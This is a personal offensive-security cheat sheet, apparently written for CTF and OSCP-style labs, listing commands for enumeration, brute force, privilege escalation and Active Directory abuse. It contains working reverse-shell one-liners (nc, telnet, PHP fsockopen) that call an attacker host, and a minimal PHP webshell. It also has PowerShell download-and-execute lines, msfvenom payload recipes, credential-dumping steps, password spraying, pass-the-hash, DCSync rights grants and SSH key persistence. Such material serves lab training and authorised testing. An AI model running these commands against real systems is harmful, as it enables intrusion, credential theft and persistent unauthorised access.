[Back to main page](https://0xa1d.github.io/)

## Index

- [Enumeration](#enumeration)
- [Vulnerabilities](#vulnerabilities)
- [Bruteforce](#bruteforce)
- [Payloads](#payloads)
- [Privesc](#privesc)
- [Get shells](#get-shells)
- [Active Directory](#active-directory)
- [Misc](#misc)

## Enumeration

### Ports & services

I always run the following 2 scans to begin with. Heard about UDP scans but I haven't needed it yet.  

- Basic scan  

```
nmap -sT -sV -sC $HOST -oN nmapinit
```
-sT : TCP connect scan, as opposed to -sS which is SYN scan. -sT is less prone to trigger IDS or some sort of defenses, since it behaves more like a "normal" connection (like browsers would do for example), whereas -sS never terminates TCP connections. The counterpart is that it is a bit slower  
-sV : Version detection  
-sC : Run default scripts (equivalent to \--script=default)  
-oN : Normal output  

- All ports (fast)  

```
nmap -p- --max-retries 0 --min-rate 5000 $HOST -oN nmapfull
```
-p- : All ports  
--max-retries : Cap number of retransmission (default is 10)  
--min-rate : Packets per second to send  

When fast scan detects more ports, I run the first scan again on the newly found ports (for example `-p 45678,45679`)  

### 21 - FTP

- Anonymous login  

```
ftp $HOST
```
Try `anonymous`:`anonymous` as credentials.

### 53 - DNS

- Zone transfer  

```
dig axfr @$HOST $DOMAIN
```
or  
```
host -l $DOMAIN $HOST
```

### 80 & 443 - Web (HTTP/HTTPS)

- Gobuster  

I always use gobuster for web enumeration, with at least 2 wordlists :  
```
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt
```
and  
```
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Depending on the situation, add `-x` option with file extensions.  
For example if server is Windows IIS you'll probably want to add `-x asp,aspx` or if server is Linux running Apache `-x html,php`.  
You may also want to find forgotten files with `-x txt,bak,old,xml`.  

More useful options :  
`--insecuressl` to ignore ssl check  
`-t 20` number of threads  
`-s 200` to restrict by HTTP status (default is 200,204,301,302,307,401,403)  

- wfuzz  

```
wfuzz -u http://$HOST/page.php?param=FUZZ -w $WORDLIST
```
Example :  
`wfuzz -u http://10.10.10.10/page.php?param=FUZZ -w /opt/seclists/Fuzzing/special-chars.txt`  

Useful options :  
\--hc : Ignore given HTTP status code  

- SSLyze  

Check if target is vulnerable to heartbleed :  
```
sslyze --heartbleed $HOST
```

- Nikto  

Check for common vulnerabilities or misconfigurations :  
```
nikto -host http://$HOST
```

- [Wappalyzer](https://www.wappalyzer.com/)  

Browser add-on which finds website technologies.  

### 88 & 464 - Kerberos

- AS-REP roasting with Impacket - GetNPUsers.py  

Get TGTs of users who have "do not require Kerberos preauthentication" set :  
```
python GetNPUsers.py $DOMAIN/ -dc-ip $HOST -request
```

For a specific user :  
```
# no creds
python GetNPUsers.py $DOMAIN/$USER -dc-ip $HOST -no-pass

# with creds
python GetNPUsers.py $DOMAIN/$USER:$PWD -dc-ip $HOST
```

- Kerbrute  

**User enumeration :**  
```
kerbrute userenum --dc $HOST -d $DOMAIN $WORDLIST
```
Example :  
`kerbrute userenum --dc 10.10.10.10 -d domain.local /opt/SecLists/Usernames/xato-net-10-million-usernames-dup.txt`  

**Bruteforce user :**  
```
kerbrute bruteuser --dc $HOST -d $DOMAIN $WORDLIST $USER
```
Example :  
`kerbrute bruteuser --dc 10.10.10.10 -d domain.local /usr/share/wordlists/rockyou.txt alice`  

**Password spray :**  
```
kerbrute passwordspray --dc $HOST -d $DOMAIN $FILE_USERS $PASSWORD
```
Example :  
`kerbrute passwordspray --dc 10.10.10.10 -d domain.local domain_users.txt Password123!`  

### 110 - POP3

Connection :  
```
telnet $IP 110
```

Login :  
```
USER $USER
PASS $PASS
```

Check mails :  
```
LIST
```

Read mail :
```
RETR X
```
Replace `X` with the number(s) returned by `LIST`.  

### 111 & 135 - RPC

- rpcclient  

Connect with null authentication :  
```
rpcclient -U '' $HOST
```

Enum users and give RIDs :  
```
rpcclient> enumdomusers
```

Enum account's descriptions :  
```
rpcclient> querydispinfo
```

Enum privileges :  
```
rpcclient> enumprivs
```

Query user with RID :  
```
rpcclient> queryuser $RID
```

Query user's groups with RID :  
```
rpcclient> queryusergroups $RID
```

Query group with RID :  
```
rpcclient> querygroup $RID
```

- RPCScan  

List RPC services :  
```
python3 rpc-scan.py $HOST --rpc
```

List mountpoints :  
```
python3 rpc-scan.py $HOST --mounts
```

List NFS shares :  
```
python3 rpc-scan.py $HOST --nfs --recurse 3
```

List on NFS share :
```
python3 nfs-ls.py nfs://$HOST/$PATH
```
Example :  
`python3 nfs-ls.py nfs://10.10.10.10/example_dir`  

Get file on NFS share :
```
python3 nfs-get.py nfs://$HOST/$PATH -d $OUT
```
Example :  
`python3 nfs-get.py nfs://10.10.10.10/example_dir/example_file.txt -d example_file.txt`  

### 139 & 445 - SMB

- smbclient  

List shares :  
```
# anonymous (no password)
smbclient -L //$HOST

# as user
smbclient -L //$HOST -U $USER
```

Connect :  
```
smbclient //$HOST -U $USER
```

Download dir recursively :
```
smb: \> prompt
smb: \> recurse
smb: \> mget $DIR
```

- smbmap  

Enum smb share :  
```
# anonymous
smbmap -H $HOST

# as user
smbmap -H $HOST [-d $DOMAIN] -u $USER -p $PWD

# recursively
smbmap -H $HOST [-d $DOMAIN] -u $USER -p $PWD -R
```
Example :  
`smbmap -H 10.10.10.10 -u bob -p 'Password123!' -R`

- crackmapexec  

Null authentication :  
```
crackmapexec smb $HOST -u '' -p ''
```

Enum :  
```
# shares :
crackmapexec smb $HOST -u $USER -p $PWD --shares

# sessions :
crackmapexec smb $HOST -u $USER -p $PWD --sessions

# disks :
crackmapexec smb $HOST -u $USER -p $PWD --disks

# logged-on users :
crackmapexec smb $HOST -u $USER -p $PWD --loggedon-users

# domain users :
crackmapexec smb $HOST -u $USER -p $PWD --users

# domain groups :
crackmapexec smb $HOST -u $USER -p $PWD --groups

# password policy :
crackmapexec smb $HOST -u $USER -p $PWD --pass-pol
```

Pass-The-Hash :  
```
crackmapexec smb $HOST -u $USER -H $HASH
```

Password spraying :  
```
# smb
crackmapexec smb $HOST -u $USER_FILE -p $PWD_FILE

# winrm
crackmapexec winrm $HOST -u $USER_FILE -p $PWD_FILE
```
With `$PWD_FILE` containing the list of passwords to test against the users listed in `$USER_FILE`.  

Execute command :
```
crackmapexec winrm $HOST -u $USER -p $PASS -X "whoami /all"
```

- enum4linux

Not actively maintained but still useful :
```
enum4linux $HOST
```

- mount smb share  

```
# no auth
mount -t cifs //$HOST/share /mnt/share

# auth
mount -t cifs -o 'username=$user,password=$password' //$HOST/share /mnt/share 
```
Example : `mount -t cifs -o 'username=alice,password=letmein' //10.10.10.10/Public /mnt/public`.  

### 389(636) & 3268(3269) - LDAP

- ldapsearch  

Basic enum :  
```
ldapsearch -h $HOST -x -s base namingcontexts
```
-h : host  
-x : simple authentication  
-s : scope  

Can be followed by :  
```
ldapsearch -h $HOST -x -b "DC=$DOMAIN" > ldap.out
```
-b : branch  
Example :  
`ldapsearch -h 10.10.10.10 -x -b "DC=domain,DC=local" > ldap.out`  

You may also want to apply filters, for example by requesting only users :  
```
ldapsearch -h $HOST -x -b "DC=$DOMAIN" '(objectClass=user)'
```

And for each user, its sAMAccountName :  
```
ldapsearch -h $HOST -x -b "DC=$DOMAIN" '(objectClass=user)' sAMAccountName
```

- ldapdomaindump  

Tool for dumping all LDAP info with valid creds :
```
ldapdomaindump -u $HOST\\$USER -p $PWD $DOMAIN
```
Example :  
`ldapdomaindump -u 10.10.10.10\\alice -p 'Password123!' domain.local`  

## Vulnerabilities

- Searchsploit  

Off-line tool for searching exploit-db.  

Basic search :  
```
searchsploit $KEYWORDS
```
Examples :  
`searchsploit ms17-010`  
`searchsploit apache 2.4`  

Get details about exploit :  
```
searchsploit -x $EXPLOIT
```

Copy exploit in current directory :  
```
searchsploit -m $EXPLOIT
```

Update database :  
```
searchsploit -u
```

## Bruteforce

- Hydra  

**Web basic authentication :**
```
hydra -l $USER -P $WORDLIST $HOST -s $PORT http-get /$DIRECTORY/$PATH
```
Example :  
`hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.10 -s 8080 /example/directory`  

**Web FORM Post :**
```
hydra -l $USER -P $WORDLIST $HOST http-post-form "/:username=^USER^&password=^PASS^&Login=Login:invalid"
```
Example :  
`hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^&Login=Login:invalid"`  
**Replace values accordingly (username, password, etc.)**  

**SSH :**  
```
hydra -l $USER -P $WORDLIST ssh://$HOST:$PORT
```
Example :  
`hydra -l alice -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10:2222`  

-f : quits after first login/password found  

- Hashcat  

I tend to prefer John over hashcat since it's (imho) easier to use, but for faster results or mass cracking Hashcat is way better since it uses the GPU.  
```
hashcat -m $HASH-TYPE -a $MODE $HASH $WORDLIST
```
Example (Kerberoast) :  
`hashcat -m 13100 -a 0 spn.hash /usr/share/wordlists/rockyou.txt`  

Hashcat is also useful for generating custom wordlists with a set of passwords as input, like this :  
```
hashcat --force --stdout -r /usr/share/hashcat/rules/best64.rule $PASS_FILE_IN > $PASS_FILE_OUT
```

- John  

```
john $HASH $WORDLIST
```
It's often as easy as "give him the password and the wordlist and let him do its thing", it automatically finds the correct hash format and tries to crack it.  

## Payloads

Some reverse shell payloads I've found successful :  

- shell  

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
```

- PHP  

```
<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"); ?>
```
or
```
$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");
```

- Webshells  

Minimal webshell :
```
<?php echo system(($_REQUEST['cmd'])); ?>
```
Execute with :  
`http://host/page?cmd=whoami`  

- msfvenom  

List payloads :  
```
msfvenom -l payloads
```

General syntax :  
```
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FILE_FORMAT > $OUTPUT_FILE
```

Reverse shell Windows :  
```
# exe
msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > rev.exe

# additional parameters
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -b "\x00" -e x86/shikata_ga_nai -f exe > $OUTPUT_FILE
```
Example :  
`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=1337 -b "\x00" -e x86/shikata_ga_nai -f exe > rev.exe`  

-a : architecture  
-b : bad characters  
-e : encoding  


## Privesc

Tools can help to find the way to privesc, but they shouldn't substitute manual enumeration. Make sure to always verify their result manually.  

### Linux

#### Tools  

[pspy](https://github.com/DominicBreuker/pspy)  
[LinEnum](https://github.com/rebootuser/LinEnum)  
[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)  
[SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM)  

#### Manual  

```
sudo -l 

ls -al /

uname -a

cat /etc/passwd

ls -alhR /home

find . -ls -type f

ls -al /var/www

ps -ef

find /usr/bin/ -perm -4000
```

### Windows  

#### Tools  

Powershell :  
[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)  
with [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)  
and [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)  
[Sherlock](https://github.com/rasta-mouse/Sherlock)  
[JAWS](https://github.com/411Hall/JAWS)  
[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)  
[SessionGopher](https://github.com/Arvanaghi/SessionGopher)  

Executables :  
[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)  
[BloodHound](https://github.com/BloodHoundAD/BloodHound)  
with [SharpHound](https://github.com/BloodHoundAD/SharpHound3)  
[Seatbelt](https://github.com/GhostPack/Seatbelt)  
[Watson](https://github.com/rasta-mouse/Watson)  

Others :  
[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)  
[Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)  
[Responder](https://github.com/lgandx/Responder)  

#### Manual  

System :  
```
# show system informations (os, version, architecture, etc.)
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# show patches, hotfixes, etc.
wmic qfe

# show hostname
hostname

# show disks
wmic logicaldisk get caption,description
```

Users & groups :  
```
# privileges and groups of current user
whoami /all

# list users
net user

# details about user
net user alice

# show local groups
net localgroup

# details about admin local group
net localgroup administrators
```

Network :  
```
# ip address, mask, dns, gateway, interfaces, etc.
ipconfig /all

# show routes
route print

# show arp table
arp -a

# show listening ports
netstat -ano
```

Processes, FW, AV :  
```
# process list
tasklist /v

# scheduled tasks
schtasks /query /fo LIST /v

# show running services
sc queryex type= service

# show infos about service
sc  query service
# example with windows defender
sc query windefend

# show firewall infos
netsh advfirewall firewall dump
# or
netsh firewall show state
netsh firewall show config
```

Search for passwords :  
```
# in files
cd C:\ & findstr /si password *.txt *.ini *.txt *.config *.xml

# in registry
reg query HKLM /F "password" /t REG_SZ /S /K

# query specific
reg query "HKLM\SOFTWARE\Microsoft\...."

# if you have access or have a backup of the c:\, SAM files are located in
c:\windows\system32\config\SAM
c:\windows\system32\config\SECURITY
c:\windows\system32\config\SYSTEM
# then use secretsdump.py from impacket
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

Others :  
```
# rights of file or directory
icacls file.txt

# hidden dir / files
dir /A:H
# powershell
gci -hidden

# recursive dir
dir /S

# search
where /R c:\windows prog.exe

# Show ADS (alternate data stream)
dir /r
more < file.txt:$stream:$DATA
# Show ADS Powershell
Get-Item -path c:\path\file.txt -stream *
# Get ADS Powershell
Get-Content c:\path\file.txt -stream $stream

# open powershell prompt with execution policy bypass
powershell -ep bypass

# run powershell file with execution policy bypass
powershell -ep bypass .\file.ps1

# load .ps1
. .\file.ps1

# start or stop service
sc start $service
sc stop $service

# query with sqlcmd
sqlcmd -Q "$query"
```

More [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md), [here](https://www.fuzzysecurity.com/tutorials/16.html) and [here](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html).

#### Common Windows privesc vectors

Disclaimer : a lot of these checks can be made automatically with [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) and `Invoke-AllChecks`, some of them even have embedded exploit function. I don't give much details about the theory behind each exploit but I strongly recommend to understand them before any exploitation.  

- [Token Impersonation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges)  

with [Juicy Potato](http://ohpe.it/juicy-potato/)  

Look for `SeImpersonatePrivilege` to `Enabled` with `whoami /priv`  

- [WSL Privesc](https://twitter.com/Warlockobama/status/1067890915753132032)  

Look for `bash.exe` and `wsl.exe` with `where /R c:\windows bash.exe` and `where /R c:\windows wsl.exe`.  

- RunAs  

Look for stored credentials with `cmdkey /list`.  

Reuse credentials found with, for example, administrator :  
```
runas /user:DOMAIN\Administrator /savecred "cmd.exe /c whoami"
```

- Autorun  

Check with sysinternal tools [Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) and [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), run `Autoruns64.exe` to look for autorun specs in HKLM and `accesschk64.exe -wvu $PROG` to check if `FILE_ALL_ACCESS` for `Everyone` is set.  
Replace the program with a malicious one (msfvenom will be handy), it will be run next time an administrator logs in.

With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Get-ModifiableRegistryAutoRun`.  

- AlwaysInstallElevated  

Check in registry with `reg query HKLM\Software\Policies\Microsoft\Windows\Installer` and `reg query HKCU\Software\Policies\Microsoft\Windows\Installer` if `AlwaysInstallElevated` is set to 1.  
Create malicious msi with msfvenom and execute it with `msiexec /quiet /qn /i c:\path\rev.msi`.  

With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Get-RegAlwaysInstallElevated` and abuse with `Write-UserAddMSI` to create local admin.  

- regsvc  

Check with `Get-Acl -Path HKLM:\System\CurrentControlSet\services\regsvc |fl` if current user has `FullControl` on registry key.  

If so, make malicious .exe with msfvenom and change the registry key with `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\path\rev.exe /f` and start service with `sc start regsvc`.  

- Insecure service file permissions  

Check with `accesschk64.exe -wvu *` if `Everyone` has `FILE_ALL_ACCESS` permission on a service executable. If so, you can replace the executable by a malicious one to privesc.  

With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Get-ServiceFilePermission` and abuse with `Install-ServiceBinary`.  

- Startup applications  

Check with `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"` if you have access, for example (F) for Full Access, to the directory.  

If so, place malicious executable in directory and log off. Next time an admin logs in, the payload will be executed.  

- DLL hijacking  

Check with sysinternals tools [Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) by applying the filters `Result` is `NAME NOT FOUND` and `Path` ends with `.dll`. If a location found is writable, it can be abused by replacing the missing dll with a crafted one (with msfvenom) and restarting the service to execute payload.  

With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Find-DLLHijack` and `Find-PathHijack` and abuse with `Write-HijackDll`.  

- Insecure service permission (binpath)  

Similar to a previous one, check with `accesschk64.exe -uwcv Everyone *` if you have RW permission on some service. You can query a specific one to get more details with `accesschk64.exe -uwcv $SERVICE`. You can then reconfigure service and supply malicious executable as parameter :
```
sc config $SERVICE binPath="c:\path\rev.exe"
net stop $SERVICE
net start $SERVICE
```

With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Get-ServicePermission` and abuse with `Invoke-ServiceAbuse`.  

- Unquoted service paths  

Look for (wait for it...) unquoted service paths in registry `HKLM\SYSTEM\CurrentControlSet\services`. If you find one, create a malicious executable with msfvenom and place it in adequate location. For example if some service has unoquoted path, like `c:\program files\vulnerable path\executable.exe`, you can place and rename the executable in `c:\program.exe` or `c:\program files\vulnerable.exe` and then restart the service. Also works if directory of .exe is writable, you can overwrite it with the reverse shell.  

With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Get-UnquotedService` and abuse with `Write-ServiceBinary`.  

- Alternative to executables  

Instead of malicious executables crafted with msfvenom, you can make custom batch file which calls nc.exe hosted on kali with smbserver (more details below).  

### CVEs

[CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)  

[MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)  
[MS16-014](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-014)  

## Get shells

Didn't know how to name and sort this category.  
When I started I was struggling with downloading / uploading or executing files and scripts between my machine and the box I was attacking, now that I'm more comfortable let me share this.

### Hosting files on Kali

- HTTP  

```
python -m SimpleHTTPServer 80
```
Files in current directory available at `http://$HOST/$FILE`  

- SMB  

This one is life-saviour, I use it on almost every Windows box
```
# no authentication will be required
impacket-smbserver share .

# authentication will be required
impacket-smbserver share . -user $USER -password $PASSWORD

# smb2 support
-smb2support
```
Files in current directory available at `\\$HOST\share\$FILE`  

For example if you have basic command execution on server but no reverse shell yet, you can start smbserver with nc.exe in current directory, and execute the following command to get a reverse shell :  
`\\10.10.10.10\share\nc.exe 10.10.10.10 1337 -e cmd.exe`  
(Of course you need to setup a listener beforehand with `nc -nvlp 1337`)  
Also check [here](#reverse-shells-from-code-execution-on-windows)  

### Downloading & Uploading files on Linux

- wget  

```
# download
wget http://$HOST/$FILE

# upload
wget --post-file=$FILE $HOST
```

- nc  

```
# download
nc -nvlp 1337 > $FILE

# upload
nc $HOST 1337 < $FILE
```

### Downloading & Uploading files on Windows

- cmd (certutil)  

```
# download
certutil.exe -urlcache -split -f http://$HOST/$FILE $OUTPUT_FILE
```

- Powershell  

```
# download
(new-object net.webclient).downloadstring('http://$HOST/$FILE')
# or 
(new-object net.webclient).downloadfile('http://$HOST/$FILE', 'C:\$PATH\$FILE.exe')

# remote exec
echo IEX(New-Object Net.WebClient).DownloadString('http://$HOST/$FILE') | powershell -noprofile -
```

More [here](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters).  

- smbserver  

See [Hosting files on Kali](#hosting-files-on-kali)  

```
# download (kind of)
copy \\$IP\share\$FILE .

# exec
\\$IP\share\$FILE.exe
```

### Reverse shells from code execution on Windows

- Basic shell

```
\\10.10.10.10\share\nc.exe 10.10.10.10 1337 -e cmd.exe
```

- Powershell with [Nishang](https://github.com/samratashok/nishang)

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 1337
```

### Reverse shells from code execution on Linux

- nc  
```
nc 10.10.10.10 1337 -e /bin/bash
```

- telnet  
```
rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet 10.10.10.10 1337 > f
```

More [here](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/) and [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).  

## Active Directory

Create user in domain :  
```
net user $USER $PASS /add /domain
```

Add user in domain group :  
```
net group "$GROUP" /add $USER
```

Add right on domain user :  
```
Add-ObjectACL -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName $USER -Rights $PRIV
```
Example :  
`Add-ObjectACL -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName banana -Rights DCSync`  

## Misc

### Common tools

- scp  

Copy file from local to remote :  
```
scp file.txt $REMOTE_USER@REMOTE_SERVER:/remote/path/
```

Copy file from remote to local :  
```
scp $REMOTE_USER@$REMOTE_SERVER:/remote/path/file.txt file.txt
```

- curl  

Useful options :  
-X : request command  
-H : header  
-d : data, specify @file.txt to upload file  
\--insecure : ignore certificate validity  
-v : verbose  

- awk  

Print only first column :  
```
awk '{print $1}'
```

- sort  

-u : remove duplicates  

- ssh port forwarding (tunneling)

Forward port 1234 of remote machine to port 5678 of local machine :  
```
ssh -L 1234:127.0.0.1:5678 user@remote
```

- plink (port forwarding)

Useful for port forwarding on Windows, downloadable [here](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html).  
Forward port 1234 of local machine to port 5678 of remote machine :
```
plink.exe -l $USER -pw $PASS -R 1234:127.0.0.1:5678 10.10.10.10
```

- find  

Search for file in current directory :  
```
find . -name file.txt
```

Exec command on files found :  
```
# exec wc -c on each file found
find . -name file.txt -exec wc -c {} \;

# echo all .txt found and exec grep $pattern on each one
find . -name *.txt -exec echo {} \; -exec grep $pattern {} \;
```

- tcpdump

Useful for checking if I have RCE, on Kali :  
```
tcpdump -i $INTERFACE icmp
```
And then execute `ping -c 1 $KALI_IP` on remote host.  

- NFS mount  

```
mount -t nfs $HOST:/remote/path /local/path
```

- strings  

Useful for checking strings in binaries. Try different encodings with `-e` which may output different results :
```
strings -e {l,L,b,B,s,S} prog.exe
```
l : 16-bit little endian  
L : 32-bit little endian  
b : 16-bit big endian  
B : 32-bit big endian  
s : 7-bit byte char (ASCII, default)  
S : 8-bit byte char  

- winexe  

```
winexe -U $USER%$PASS //$IP "cmd.exe"
```

- xfreerdp  

```
xfreerdp /u:$USER /v:$IP:$PORT
```

- [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)  

You can connect with creds like this :  
```
mssqlclient.py $DOMAIN/$USER:'$PASS'@$IP -windows-auth
```

And then try to get a shell with `enable_xp_cmdshell` and `xp_cmdshell whoami`, or use [this exploit](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478). More [here](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server).  

- Linux timesaver  

```
# search through command history
ctrl r

# cycle through last arguments (french keyboard)
alt shift ;

# move cursor to end
ctrl e

# move cursor to start
ctrl a

# replacement for last command
!!
# useful if you forgot sudo on last command, type
sudo !!

# replacements for last argument
!$

# replacement for all last arguments
!*

# go to last directory
cd -

# cp while appending something to a filename (for example for backups)
cp file{,.old}
```

More [here](https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20presentations/DEFCON-26-Egypt-One-Liners-to-Rule-Them-All-Updated.pdf) and [here](https://opensource.com/article/18/5/bash-tricks).  

### Other tools  

[evil-winrm](https://github.com/Hackplayers/evil-winrm)  
[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)  
[Impacket](https://github.com/SecureAuthCorp/impacket) with GetUserSPNs, psexec, smbserver, GetNPUsers, secretsdump and many more  
[SecLists](https://github.com/danielmiessler/SecLists)  
[Nishang](https://github.com/samratashok/nishang)  
[Ghidra](https://ghidra-sre.org/)  

- Steganography  

exiftool  
steghide  
foremost  
binwalk  

### Improve shell

```
python3 -c "import pty;pty.spawn('/bin/bash')"
ctrl Z
stty raw -echo
fg
export TERM=screen
```

### Export SSH keys

Handy if you own user and want ssh session but don't have its password.
Generate new key pair (on Kali) :  
```
ssh-keygen -t rsa
```

And then copy `id_rsa.pub` in `/home/$USER/.ssh/authorized_keys` of remote host. Then simply connect as the given user :
```
ssh $USER@$REMOTE_HOST
```
